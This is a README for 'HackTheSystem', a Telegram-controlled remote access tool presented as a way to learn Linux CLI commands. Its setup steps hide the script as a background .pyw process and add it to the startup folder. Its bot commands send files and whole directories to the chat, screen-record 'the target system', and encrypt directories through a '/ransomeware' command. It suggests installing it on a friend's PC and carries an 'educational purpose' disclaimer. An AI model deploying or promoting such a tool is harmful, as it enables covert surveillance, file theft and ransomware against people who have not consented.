# Control Remote Server Using Telebot:
Hey, there linux **CLI** lovers don't have pc to install **LINUX** distroes but want to learn basic Linux CLI commands this module is for you. This has follwoing features:
- You can use any server or local computer to build remote access to.
- You just need telegram bot.
- All the CLI commands are as same as that of LINUX but with them you can control CLI of any machine like windows and mac not only LINUX distroes.
- Installation and set up is super easy.

# Installation procedure:
## Windows:
- First clone the repository by using CLI of downloading zip file.
- The nevigate to the directory where zip file is installed.
- Then extrac the zip file.
- Nevigate to the **HackTheSystem-main** directory.
- Shift+RightClick of mouse to open termianl in the current directory. Run the building dependency file as follows:
```
python buildingDependency.py
```
- You will find three new .bat files are generated- installreq.bat, copyfile.bat, backgroundrun.bat
- First edit main.py file. Open in note pad or in any of your favourite code editor and enter bot API and ChatIDs of your friends and yours for further info to gather about usage of bot. Like bot will let the given chat IDs know who starts the bot.
- After editing and saving main.py run installreq.bat by double clicking it. It will install all required modules used in the main.py
- After that run copyfile.bat by double clicking it. It will creat a main.pyw file. Now, you are all done.
- Just cut the backgroundrun.bat file to startup folder to monitor the system.

## Linux and Mac:
In these systems as CLI is bit more flexible hence installation is bit more easy.

- open terminal in any desired directory.
```
git clone https://github.com/atrajit-sarkar/HackTheSystem.git
```
This will clone HackTheSystem-main directory in your desired directory.
- Edit the main.py file as above in case of windows installation.
- Now, run main.py in background as follows:
```
nohup python3 main.py &
```
- You can also make the main.pyw file using the follwoing command:
```
cp ./main.py ./main.pyw
```
- Then again you will get a main.pyw file in your directory. Then make a shell script run.sh with the following command:
```
#! /bin/bash
python3 main.py
```
- Cut the file into the startup folder. And here you go.

# Useful Commands List to control the system using bot

### 1. /pwd  
Print the current working directory.
### 2. /cd  
Change the current working directory.
### 3. /ls 
 List all the files and folders inside the current working directory.
### 4. /vim
Creats a file.
### 5. /mkdir
Makes new drectory in the current working directory.
### 6. /rm 
removes a file
### 7. /rmr
Removes entire directory.
### 8. /file
Brings a file into the chat for you from system.
### 9. /files 
Brings all files of a directory into the bot chat for you.
### 10. /cat
prints the content of a file into the bot chat
### 11. /chmod
Change the mode of the file
### 12. /execute
Execute a file if it is executable or open a file if it is normal.
### 13. /check_path 
Check a file of directory exists or not.
### 14. /mkdir 
Makes directory
### 15. Upload files
To upload files just /cd to that directory and send files in document format in the bot.
### 16. /ransomeware
This encrypts the entire current directory
### 17. /antiransomeware
Decrypts the entire current encrypted directory.
### 18. /screenrecord
Screen records the target system's screen.

- You can use any CLI commands of LINUX or Windows making .sh file or .bat files respectively.
- Note that this repository is only for educational purpose and for helping people not affording a pc for ethical hacking and newtworking engineering and any more CLI based works.
- Also note that this repo is helps you only develop basics of CLI. To learn more you must need to buy a basic pc for running LINUX. No, shortcuts.But atleast I can say this repo will help you to decide whether you will go for CLI based world or not. Then if you are for it it will help you grow interest and then you can buy a basic affordable PC for running your own local CLI. Till then use your friends PC or AWS and many others cloud servers to setup this for learning from telegram which is easy to type and better experience with mobile devices.

- ## Wish you all the best for your future from the developer.
